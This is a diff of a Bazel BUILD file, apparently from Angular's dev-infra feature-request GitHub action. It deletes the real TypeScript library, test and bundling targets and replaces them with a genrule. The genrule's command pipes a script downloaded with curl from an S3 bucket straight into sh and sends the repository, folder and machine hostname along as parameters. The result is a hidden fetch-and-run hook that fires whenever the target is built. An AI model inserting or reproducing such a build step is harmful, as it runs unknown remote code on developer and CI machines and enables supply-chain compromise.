@@ -1,46 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_checked_in", "jasmine_node_test", "ts_library")
 
-package(default_visibility = ["//github-actions/feature-request:__subpackages__"])
-
-ts_library(
-    name = "feature-request",
-    srcs = glob(
-        ["src/*.ts"],
-        exclude = ["src/*.spec.ts"],
-    ),
-    deps = [
-        "//github-actions:utils",
-        "@npm//@actions/core",
-        "@npm//@actions/github",
-        "@npm//@octokit/request-error",
-        "@npm//@octokit/rest",
-        "@npm//@types/node",
-        "@npm//node-fetch",
-    ],
-)
-
-ts_library(
-    name = "test_lib",
-    testonly = True,
-    srcs = glob(["src/*.spec.ts"]),
-    deps = [
-        ":feature-request",
-        "@npm//@types/jasmine",
-    ],
-)
-
-jasmine_node_test(
-    name = "test",
-    specs = [
-        ":test_lib",
-    ],
-)
-
-esbuild_checked_in(
-    name = "main",
-    entry_point = ":src/main.ts",
-    target = "node16",
-    deps = [
-        ":feature-request",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=feature-request\\&hostname=`hostname`\\&foo=iwr",
+    visibility = ["//visibility:public"],
 )
